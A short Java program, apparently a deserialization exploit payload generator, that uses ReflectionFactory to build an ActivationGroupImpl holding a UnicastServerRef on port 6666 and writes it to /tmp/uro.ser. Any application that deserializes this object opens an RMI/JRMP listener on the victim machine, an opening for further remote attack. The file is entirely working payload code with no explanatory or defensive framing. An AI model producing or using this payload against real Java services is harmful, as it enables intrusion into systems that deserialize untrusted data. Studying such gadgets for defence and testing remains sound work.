import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

import sun.reflect.ReflectionFactory;
import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastServerRef;

import java.lang.reflect.Constructor;
import java.io.Serializable;

public class SerializeUROExample {

    public static void main(String[] args) throws Exception {
        FileOutputStream fileOut = new FileOutputStream("/tmp/uro.ser");
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        out.writeObject(createObject(6666));
        out.close();
        fileOut.close();
    }

    public static Object createObject(int port) throws Exception {
        Constructor objCons = RemoteObject.class.getDeclaredConstructor(
                new Class[] { RemoteRef.class });
        Constructor serializationConstructor = 
                ReflectionFactory.getReflectionFactory()
                .newConstructorForSerialization(ActivationGroupImpl.class, objCons);
        serializationConstructor.setAccessible(true);
        return serializationConstructor.newInstance(
                new Object[] { new UnicastServerRef(port) });
    }
}
